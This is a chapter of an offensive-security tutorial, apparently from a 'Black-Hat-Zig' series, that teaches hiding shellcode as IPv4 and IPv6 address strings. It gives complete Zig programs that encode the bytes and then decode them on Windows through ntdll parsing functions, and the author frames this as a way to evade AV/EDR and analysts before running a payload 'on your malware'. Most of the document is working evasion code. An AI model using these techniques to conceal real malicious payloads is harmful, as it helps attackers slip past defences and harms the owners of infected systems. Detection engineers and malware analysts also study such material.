# IP Address Obfuscation

## TL;DR

[See the code example](https://github.com/CX330Blake/Black-Hat-Zig/tree/main/src/Payload-Obfuscation/IP-Address-Obfuscation)

## Explanation

IP address obfuscation disguises shellcode bytes as seemingly harmless IP
strings. Each byte is translated into a portion of an IPv4 or IPv6 address,
making the payload appear like configuration data or network traffic. When the
program runs, it parses these strings back into binary form to reconstruct the
original shellcode for execution. While trivial to decode once discovered, this
method can bypass naive scans that look for typical shellcode byte patterns in
files or memory dumps.

## Intro

Actually, to evade AV/EDR, you can do more than just hiding your payload in different section. You need to obfuscate the code so that the reverse engineers and malware analyst can't get the clear logic, control flow, or meaningful strings without heavily static or dynamic analysis.

In this chapter, I will show you how to obfuscate your payload as IP address. We have both IPv4 and IPv6. Also, we provide the deobfuscation functions so that you can run the actual payload later on your malware.

## IPv4 Obfuscation

IPv4 is constructed with 4 numbers from 0 to 255 with the size range of the number is 256 (2^8). So each number can represent 1 byte of the payload. If we represent the payload in hex, for example, we let the payload to be this.

```zig
const payload = [_]u8{0xDE, 0xAD, 0xBE, 0xEF};
```

That payload is 4 bytes in total. Then the IPv4 obfuscation result will be **222.173.190.239**. If you don't know how to convert decimal to hexadecimal or vice versa, you should go learn it first to better understand the content.

In Zig, an 8 byte value can use the type `u8`, which stands for **unsigned integer with 8 bits size**. So the implementation is simple, just convert the decimal to hexadecimal representation. Since they're all just integers, we can use the format string to do this.

```zig title="main.zig"
const std = @import("std");
const Allocator = std.mem.Allocator;

// Function takes in 4 raw bytes and returns them in an IPv4 string format
fn generateIpv4(allocator: Allocator, a: u8, b: u8, c: u8, d: u8) ![]u8 {
    // Creating the IPv4 address string
    return try std.fmt.allocPrint(allocator, "{d}.{d}.{d}.{d}", .{ a, b, c, d });
}

/// Generate the IPv4 output representation of the shellcode
/// Function requires an allocator and shellcode as the input
fn generateIpv4Output(allocator: Allocator, shellcode: []const u8) !bool {
    const stdout = std.io.getStdOut().writer();

    // If the shellcode buffer is empty or the size is not a multiple of 4, exit
    if (shellcode.len == 0 or shellcode.len % 4 != 0) {
        return false;
    }

    try stdout.print("const ipv4_array = [_][*:0]const u8{{\n\t", .{});

    // We will read one shellcode byte at a time, when the total is 4, begin generating the IPv4 address
    // The variable 'c' is used to store the number of bytes read. By default, starts at 4.
    var c: usize = 4;
    var counter: usize = 0;

    var i: usize = 0;
    while (i < shellcode.len) : (i += 1) {
        // Track the number of bytes read and when they reach 4 we enter this if statement to begin generating the IPv4 address
        if (c == 4) {
            counter += 1;

            // Generating the IPv4 address from 4 bytes which begin at i until [i + 3]
            const ip = try generateIpv4(allocator, shellcode[i], shellcode[i + 1], shellcode[i + 2], shellcode[i + 3]);
            defer allocator.free(ip); // Free the allocated string when done

            if (i == shellcode.len - 4) {
                // Printing the last IPv4 address
                try stdout.print("\"{s}\"", .{ip});
                break;
            } else {
                // Printing the IPv4 address
                try stdout.print("\"{s}\", ", .{ip});
            }

            c = 1;

            // Optional: To beautify the output on the console
            if (counter % 8 == 0) {
                try stdout.print("\n\t", .{});
            }
        } else {
            c += 1;
        }
    }

    try stdout.print("\n}};\n\n", .{});
    return true;
}

pub fn main() !void {
    // Create an arena allocator that frees all allocations at once at the end
    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();

    const allocator = arena.allocator();
    // Example shellcode (must be a multiple of 4 bytes)
    const shellcode = [_]u8{
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, // Add more shellcode here if needed
    };

    // Generate and print the IPv4 representation
    _ = try generateIpv4Output(allocator, &shellcode);
}
```

## IPv4 Deobfuscation

[Source code](https://github.com/CX330Blake/Black-Hat-Zig/tree/main/Payload-Obfuscation/IP-Address-Obfuscation/ipv4_deobfuscation)

```zig title="main.zig"
const std = @import("std");
const win = std.os.windows;
const kernel32 = win.kernel32;

const NTSTATUS = win.NTSTATUS;
const BOOLEAN = win.BOOLEAN;
const PCSTR = [*:0]const u8;
const PVOID = ?*anyopaque;
const PBYTE = [*]u8;
const SIZE_T = usize;

// Define function pointer type for RtlIpv4StringToAddressA
const fnRtlIpv4StringToAddressA = fn (
    S: PCSTR,
    Strict: BOOLEAN,
    Terminator: *PCSTR,
    Addr: PVOID,
) callconv(win.WINAPI) NTSTATUS;

/// Deobfuscates an array of IPv4 strings into a byte buffer
pub fn ipv4Deobfuscation(
    ipv4Array: []const [*:0]const u8,
    allocator: std.mem.Allocator,
) !struct { buffer: []u8, size: SIZE_T } {
    // Create a UTF-16 string for "NTDLL"
    const ntdll_w: [*:0]const u16 = std.unicode.utf8ToUtf16LeStringLiteral("NTDLL");

    // Load the NTDLL library using wide string
    const ntdll_module = kernel32.GetModuleHandleW(ntdll_w);
    if (ntdll_module == null) {
        std.debug.print("[!] GetModuleHandle Failed With Error : {}\n", .{kernel32.GetLastError()});
        return error.GetModuleHandleFailed;
    }

    // Get the address of RtlIpv4StringToAddressA function
    const rtlIpv4StringToAddressA_ptr = kernel32.GetProcAddress(ntdll_module.?, "RtlIpv4StringToAddressA");
    if (rtlIpv4StringToAddressA_ptr == null) {
        std.debug.print("[!] GetProcAddress Failed With Error : {}\n", .{kernel32.GetLastError()});
        return error.GetProcAddressFailed;
    }

    // Cast the function pointer to the correct type
    const rtlIpv4StringToAddressA: *const fnRtlIpv4StringToAddressA = @ptrCast(rtlIpv4StringToAddressA_ptr);

    // Calculate the size of the buffer needed (number of IPv4 addresses * 4 bytes each)
    const bufferSize = ipv4Array.len * 4;

    // Allocate memory for the deobfuscated shellcode
    var buffer = try allocator.alloc(u8, bufferSize);
    errdefer allocator.free(buffer);

    // Deobfuscate each IPv4 address
    for (ipv4Array, 0..) |ipAddress, i| {
        var terminator: PCSTR = undefined;

        // Calculate the offset in the buffer for this IPv4 address
        const offset = i * 4;

        // Convert the IPv4 string to bytes
        const status = rtlIpv4StringToAddressA(ipAddress, win.FALSE, &terminator, &buffer[offset]);

        // Check if the status is not SUCCESS (0)
        // Use the proper status constant from the ntstatus module
        if (status != NTSTATUS.SUCCESS) {
            std.debug.print("[!] RtlIpv4StringToAddressA Failed At [{s}] With Error 0x{X:0>8}\n", .{ ipAddress, @intFromEnum(status) });
            return error.RtlIpv4StringToAddressFailed;
        }
    }

    return .{ .buffer = buffer, .size = bufferSize };
}

pub fn main() !void {
    // Setup allocator
    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();
    const allocator = arena.allocator();

    // Example array of IPv4 addresses
    const ipv4_array = [_][*:0]const u8{ "252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81" };
    std.debug.print("[+] Attempting to deobfuscate {} IPv4 addresses\n", .{ipv4_array.len});

    // Call the deobfuscation function
    const result = try ipv4Deobfuscation(&ipv4_array, allocator);
    defer allocator.free(result.buffer);

    std.debug.print("[+] Successfully deobfuscated shellcode\n", .{});
    std.debug.print("[+] Buffer size: {} bytes\n", .{result.size});

    // Optionally print the bytes (first 16 bytes or fewer if smaller)
    const bytes_to_print = @min(result.size, 16);
    std.debug.print("[+] First {} bytes: ", .{bytes_to_print});
    for (result.buffer[0..bytes_to_print]) |byte| {
        std.debug.print("{X:0>2} ", .{byte});
    }
    std.debug.print("\n", .{});
}
```

## IPv6 Obfuscation

[Source code](https://github.com/CX330Blake/Black-Hat-Zig/tree/main/Payload-Obfuscation/IP-Address-Obfuscation/ipv6_obfuscation)

```zig title="main.zig"
const std = @import("std");
const Allocator = std.mem.Allocator;

/// Function takes in 16 raw bytes and returns them in an IPv6 address string format
fn generateIpv6(allocator: Allocator, bytes: [16]u8) ![]u8 {
    // Each segment is 2 bytes (4 hex characters + colon)
    // Format as 8 segments of 2 bytes each with colons between them
    return try std.fmt.allocPrint(
        allocator,
        "{X:0>2}{X:0>2}:{X:0>2}{X:0>2}:{X:0>2}{X:0>2}:{X:0>2}{X:0>2}:{X:0>2}{X:0>2}:{X:0>2}{X:0>2}:{X:0>2}{X:0>2}:{X:0>2}{X:0>2}",
        .{
            bytes[0],  bytes[1],  bytes[2],  bytes[3],
            bytes[4],  bytes[5],  bytes[6],  bytes[7],
            bytes[8],  bytes[9],  bytes[10], bytes[11],
            bytes[12], bytes[13], bytes[14], bytes[15],
        },
    );
}

/// Generate the IPv6 output representation of the shellcode
/// Function requires a slice to the shellcode buffer
fn generateIpv6Output(allocator: Allocator, shellcode: []const u8) !bool {
    const stdout = std.io.getStdOut().writer();

    // If the shellcode buffer is empty or the size is not a multiple of 16, exit
    if (shellcode.len == 0 or shellcode.len % 16 != 0) {
        return false;
    }

    try stdout.print("const ipv6_array = [_][*:0]const u8{{\n    ", .{});

    // We will read one shellcode byte at a time, when the total is 16, begin generating the IPv6 address
    // The variable 'c' is used to store the number of bytes read. By default, starts at 16.
    var c: usize = 16;
    var counter: usize = 0;

    var i: usize = 0;
    while (i < shellcode.len) : (i += 1) {
        // Track the number of bytes read and when they reach 16 we enter this if statement to begin generating the IPv6 address
        if (c == 16) {
            counter += 1;

            // Create a temporary array to hold the 16 bytes
            var temp_bytes: [16]u8 = undefined;
            @memcpy(temp_bytes[0..], shellcode[i..][0..16]);

            // Generating the IPv6 address from 16 bytes
            const ip = try generateIpv6(allocator, temp_bytes);
            defer allocator.free(ip);

            if (i == shellcode.len - 16) {
                // Printing the last IPv6 address
                try stdout.print("\"{s}\"", .{ip});
                break;
            } else {
                // Printing the IPv6 address
                try stdout.print("\"{s}\", ", .{ip});
            }

            c = 1;

            // Optional: To beautify the output on the console
            if (counter % 3 == 0) {
                try stdout.print("\n    ", .{});
            }
        } else {
            c += 1;
        }
    }

    try stdout.print("\n}};\n\n", .{});
    return true;
}

pub fn main() !void {
    // Create an arena allocator for efficient memory management
    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();

    const allocator = arena.allocator();

    // Example shellcode (must be a multiple of 16 bytes)
    const shellcode = [_]u8{
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, // Add more shellcode here if needed
    };

    // Generate and print the IPv6 representation
    _ = try generateIpv6Output(allocator, &shellcode);
}
```

## IPv6 Deobfuscation

[Source code](https://github.com/CX330Blake/Black-Hat-Zig/tree/main/Payload-Obfuscation/IP-Address-Obfuscation/ipv6_deobfuscation)

```zig title="main.zig"
const std = @import("std");
const win = std.os.windows;
const kernel32 = win.kernel32;

const NTSTATUS = win.NTSTATUS;
const BOOLEAN = win.BOOLEAN;
const PCSTR = [*:0]const u8;
const PVOID = ?*anyopaque;
const PBYTE = [*]u8;
const SIZE_T = usize;

// Define function pointer type for RtlIpv6StringToAddressA
const fnRtlIpv6StringToAddressA = fn (
    S: PCSTR,
    Terminator: *PCSTR,
    Addr: PVOID,
) callconv(win.WINAPI) NTSTATUS;

/// Deobfuscates an array of IPv6 strings into a byte buffer
pub fn ipv6Deobfuscation(
    ipv6Array: []const [*:0]const u8,
    allocator: std.mem.Allocator,
) !struct { buffer: []u8, size: SIZE_T } {
    // Create a UTF-16 string for "NTDLL"
    const ntdll_w: [*:0]const u16 = std.unicode.utf8ToUtf16LeStringLiteral("NTDLL");

    // Load the NTDLL library using wide string
    const ntdll_module = kernel32.GetModuleHandleW(ntdll_w);
    if (ntdll_module == null) {
        std.debug.print("[!] GetModuleHandle Failed With Error : {}\n", .{kernel32.GetLastError()});
        return error.GetModuleHandleFailed;
    }

    // Get the address of RtlIpv6StringToAddressA function
    const rtlIpv6StringToAddressA_ptr = kernel32.GetProcAddress(ntdll_module.?, "RtlIpv6StringToAddressA");
    if (rtlIpv6StringToAddressA_ptr == null) {
        std.debug.print("[!] GetProcAddress Failed With Error : {}\n", .{kernel32.GetLastError()});
        return error.GetProcAddressFailed;
    }

    // Cast the function pointer to the correct type
    const rtlIpv6StringToAddressA: *const fnRtlIpv6StringToAddressA = @ptrCast(rtlIpv6StringToAddressA_ptr);

    // Calculate the size of the buffer needed (number of IPv6 addresses * 16 bytes each)
    const bufferSize = ipv6Array.len * 16; // IPv6 addresses are 16 bytes each

    // Allocate memory for the deobfuscated shellcode
    const buffer = try allocator.alloc(u8, bufferSize);
    errdefer allocator.free(buffer);

    // Using a raw pointer to keep track of our current position
    var tmpBuffer: [*]u8 = buffer.ptr;

    // Deobfuscate each IPv6 address
    for (ipv6Array) |ipv6Address| {
        var terminator: PCSTR = undefined;

        // Convert the IPv6 string to bytes
        const status = rtlIpv6StringToAddressA(ipv6Address, &terminator, tmpBuffer);

        // Check if the status is not SUCCESS (0)
        if (status != NTSTATUS.SUCCESS) {
            std.debug.print("[!] RtlIpv6StringToAddressA Failed At [{s}] With Error 0x{X:0>8}\n", .{ ipv6Address, @intFromEnum(status) });
            return error.RtlIpv6StringToAddressFailed;
        }

        // Increment tmpBuffer by 16 bytes for the next address
        // Fixed version using pointer arithmetic
        tmpBuffer = @as([*]u8, @ptrFromInt(@intFromPtr(tmpBuffer) + 16));
    }

    return .{ .buffer = buffer, .size = bufferSize };
}

pub fn main() !void {
    // Setup allocator
    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();
    const allocator = arena.allocator();

    // Example array of IPv6 addresses (shellcode encoded as IPv6)
    const ipv6_array = [_][*:0]const u8{
        "fc48:83e4:f0e8:c000:0000:4151:4150:5251",
    };

    std.debug.print("[+] Attempting to deobfuscate {} IPv6 addresses\n", .{ipv6_array.len});

    // Call the deobfuscation function
    const result = try ipv6Deobfuscation(&ipv6_array, allocator);
    defer allocator.free(result.buffer);

    std.debug.print("[+] Successfully deobfuscated shellcode\n", .{});
    std.debug.print("[+] Buffer size: {} bytes\n", .{result.size});

    // Print all bytes
    std.debug.print("[+] Deobfuscated bytes: ", .{});
    for (result.buffer) |byte| {
        std.debug.print("{X:0>2} ", .{byte});
    }
    std.debug.print("\n", .{});
}
```
